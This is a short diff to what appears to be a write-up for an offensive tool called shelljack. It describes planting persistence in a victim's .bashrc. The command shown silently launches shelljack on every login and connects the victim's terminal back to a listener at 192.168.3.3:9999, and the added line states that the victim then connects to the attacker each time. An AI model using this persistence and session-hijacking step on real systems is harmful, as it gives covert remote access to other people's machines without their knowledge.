@@ -63,3 +63,5 @@ To apply the persistence we have to modify .bashrc in the victim's machine and a
 ```bash
 tty &>/dev/null; /home/code/shelljack/shelljack -n 192.168.3.3:9999 $$ &>/dev/null
 ```
+
+Now, everytime the victim logs in the machine, if we have the listener, he is going to connect us.
